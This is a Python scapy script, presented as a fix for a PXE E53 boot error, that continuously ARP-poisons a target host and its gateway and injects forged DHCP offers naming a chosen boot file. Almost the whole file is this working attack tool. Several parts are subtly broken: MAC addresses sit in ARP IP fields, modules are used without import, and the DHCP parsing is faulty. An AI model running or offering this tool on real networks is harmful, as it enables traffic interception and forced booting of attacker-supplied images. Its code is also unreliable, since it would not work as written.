#!/usr/bin/env python3
"""
ULTRA-AGGRESSIVE PXE E53 FIX - ARP POISONING DHCP INJECTOR
==========================================================

This script uses ARP poisoning to directly inject DHCP responses into the ethernet segment,
completely bypassing router filtering and isolation. Sends DHCP responses directly to the
PC's MAC address using broadcast MAC to reach all ethernet clients.

REQUIREMENTS:
- scapy (pip install scapy)
- root/sudo privileges for raw sockets
- Network interface access

USAGE: sudo python3 ULTRA_PXE_INJECTOR.py <target_mac> <boot_filename>
"""

import sys
import os
import time
import threading
import socket
import struct
import select
import logging
from datetime import datetime

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

try:
    from scapy.all import *
    from scapy.layers.dhcp import DHCP, BOOTP
    from scapy.layers.l2 import ARP, Ether
    from scapy.layers.inet import IP, UDP
    from scapy.layers.dns import DNS
except ImportError:
    print("ERROR: scapy not installed. Install with: pip install scapy")
    sys.exit(1)

class ARPPoisoningDHCPInjector:
    """Ultra-aggressive ARP poisoning DHCP injector that bypasses router filtering."""
    
    def __init__(self, target_mac, boot_filename, interface="eth0"):
        self.target_mac = target_mac
        self.boot_filename = boot_filename
        self.interface = interface
        self.attacker_mac = self.get_interface_mac(interface)
        self.attacker_ip = self.get_interface_ip(interface)
        self.gateway_ip = self.get_gateway_ip()
        self.attack_running = False
        
        # DHCP response parameters
        self.server_ip = "192.168.1.100"  # Our fake DHCP server IP
        self.yiaddr = "192.168.1.150"     # IP to assign to target
        self.subnet_mask = "255.255.255.0"
        self.router = "192.168.1.1"
        self.dns_servers = ["8.8.8.8", "8.8.4.4"]
        self.broadcast = "192.168.1.255"
        
        logger.info(f"🎯 ARP Poisoning DHCP Injector initialized")
        logger.info(f"📍 Target MAC: {target_mac}")
        logger.info(f"🔧 Boot filename: {boot_filename}")
        logger.info(f"🌐 Interface: {interface}")
        logger.info(f"🎭 Attacker MAC: {self.attacker_mac}")
        logger.info(f"📡 Attacker IP: {self.attacker_ip}")

    def get_interface_mac(self, interface):
        """Get MAC address of network interface."""
        try:
            import fcntl
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            info = fcntl.ioctl(sock.fileno(), 0x8927, struct.pack('256s', interface[:15].encode()))
            return ':'.join(['%02x' % (ord(char)) for char in info[18:24]])
        except:
            # Fallback method
            try:
                result = subprocess.check_output(['ip', 'link', 'show', interface])
                mac_line = result.decode().split(interface)[1].split('link/ether')[1].split()[0]
                return mac_line
            except:
                return "00:11:22:33:44:55"  # Fallback MAC

    def get_interface_ip(self, interface):
        """Get IP address of network interface."""
        try:
            result = subprocess.check_output(['ip', '-4', 'addr', 'show', interface])
            lines = result.decode().split('\n')
            for line in lines:
                if 'inet ' in line and 'scope global' in line:
                    return line.strip().split()[1].split('/')[0]
        except:
            return "192.168.1.100"  # Fallback IP
        return "192.168.1.100"

    def get_gateway_ip(self):
        """Get gateway IP address."""
        try:
            result = subprocess.check_output(['ip', 'route', 'show', 'default'])
            for line in result.decode().split('\n'):
                if 'default via' in line:
                    return line.split()[2]
        except:
            return "192.168.1.1"  # Fallback gateway
        return "192.168.1.1"

    def arp_poison_target(self):
        """Continuously poison target ARP table to redirect traffic through us."""
        logger.info(f"🔥 Starting ARP poisoning of target {self.target_mac}")
        
        # Send ARP reply claiming we are the gateway
        arp_reply = ARP(
            op=2,
            psrc=self.gateway_ip,
            pdst=self.target_mac,
            hwsrc=self.attacker_mac,
            hwdst=self.target_mac
        )
        
        # Send ARP reply claiming we are the target to the gateway
        arp_reply_target = ARP(
            op=2,
            psrc=self.target_mac,
            pdst=self.gateway_ip,
            hwsrc=self.attacker_mac,
            hwdst="ff:ff:ff:ff:ff:ff"
        )
        
        while self.attack_running:
            try:
                # Poison target's ARP table
                send(arp_reply, verbose=0, iface=self.interface)
                
                # Poison gateway's ARP table
                send(arp_reply_target, verbose=0, iface=self.interface)
                
                time.sleep(2)  # Send ARP updates every 2 seconds
            except Exception as e:
                logger.error(f"ARP poisoning error: {e}")
                time.sleep(5)

    def inject_dhcp_response(self, dhcp_request):
        """Inject DHCP response directly to target using ARP poisoning."""
        logger.info(f"💉 Injecting DHCP response to {self.target_mac}")
        
        try:
            # Create DHCP response packet
            dhcp_response = IP(src=self.server_ip, dst="255.255.255.255")/UDP(sport=67, dport=68)/BOOTP(
                op=2,
                yiaddr=self.yiaddr,
                siaddr=self.server_ip,
                chaddr=self.target_mac.replace(':', '').encode()
            )/DHCP(
                options=[
                    ("message-type", "offer"),
                    ("server_id", self.server_ip),
                    ("subnet_mask", self.subnet_mask),
                    ("router", self.router),
                    ("dns_server", self.dns_servers),
                    ("broadcast", self.broadcast),
                    ("lease_time", 86400),
                    ("boot_filename", self.boot_filename),
                    ("end", "")
                ]
            )
            
            # Inject via ethernet broadcast
            ethernet_frame = Ether(
                dst="ff:ff:ff:ff:ff:ff",  # Broadcast
                src=self.attacker_mac,
                type=0x0800  # IP
            ) / dhcp_response
            
            # Send via raw ethernet frame
            sendp(ethernet_frame, verbose=0, iface=self.interface)
            
            logger.info(f"✅ DHCP offer injected: {self.yiaddr} -> {self.boot_filename}")
            
            # Also send unicast response directly to target
            unicast_frame = Ether(
                dst=self.target_mac,
                src=self.attacker_mac,
                type=0x0800
            ) / dhcp_response
            
            sendp(unicast_frame, verbose=0, iface=self.interface)
            logger.info(f"✅ DHCP offer unicast sent to {self.target_mac}")
            
        except Exception as e:
            logger.error(f"DHCP injection error: {e}")

    def capture_dhcp_requests(self):
        """Capture DHCP requests and inject responses."""
        logger.info(f"🎣 Capturing DHCP requests on {self.interface}")
        
        # Filter for DHCP requests
        filter_str = "udp and port 67 and ether dst ff:ff:ff:ff:ff:ff"
        
        def packet_handler(packet):
            if packet.haslayer(BOOTP) and packet.haslayer(DHCP):
                dhcp_layer = packet[DHCP]
                if b'\x01\x03\x06' in dhcp_layer.options:  # DHCP Discover
                    logger.info(f"🔥 DHCP DISCOVER detected from {packet[Ether].src}")
                    # Inject response after small delay
                    threading.Timer(0.1, self.inject_dhcp_response, args=[packet]).start()
                elif b'\x01\x01\x06' in dhcp_layer.options:  # DHCP Request
                    logger.info(f"🔥 DHCP REQUEST detected from {packet[Ether].src}")
                    # Inject response after small delay
                    threading.Timer(0.1, self.inject_dhcp_response, args=[packet]).start()
        
        try:
            sniff(filter=filter_str, iface=self.interface, prn=packet_handler, store=0)
        except Exception as e:
            logger.error(f"Sniffing error: {e}")

    def start_attack(self):
        """Start the ultra-aggressive ARP poisoning DHCP injection attack."""
        logger.info(f"🚀 Starting ULTRA-AGGRESSIVE PXE E53 BYPASS")
        logger.info(f"🎯 Target: {self.target_mac}")
        logger.info(f"⚡ Method: ARP Poisoning + DHCP Injection")
        
        # Check if running as root
        if os.geteuid() != 0:
            logger.error("❌ This script must be run as root (sudo)")
            sys.exit(1)
        
        self.attack_running = True
        
        try:
            # Start ARP poisoning in background
            arp_thread = threading.Thread(target=self.arp_poison_target, daemon=True)
            arp_thread.start()
            
            logger.info(f"🔥 ARP poisoning started")
            time.sleep(2)  # Let ARP poisoning establish
            
            # Start DHCP injection
            logger.info(f"💉 Starting DHCP injection")
            self.capture_dhcp_requests()
            
        except KeyboardInterrupt:
            logger.info(f"🛑 Attack stopped by user")
        finally:
            self.attack_running = False

def main():
    if len(sys.argv) != 3:
        print("Usage: sudo python3 ULTRA_PXE_INJECTOR.py <target_mac> <boot_filename>")
        print("Example: sudo python3 ULTRA_PXE_INJECTOR.py aa:bb:cc:dd:ee:ff pxelinux.0")
        sys.exit(1)
    
    target_mac = sys.argv[1]
    boot_filename = sys.argv[2]
    
    # Validate MAC address format
    if not re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', target_mac):
        print("❌ Invalid MAC address format. Use AA:BB:CC:DD:EE:FF")
        sys.exit(1)
    
    try:
        injector = ARPPoisoningDHCPInjector(target_mac, boot_filename)
        injector.start_attack()
    except Exception as e:
        logger.error(f"❌ Fatal error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()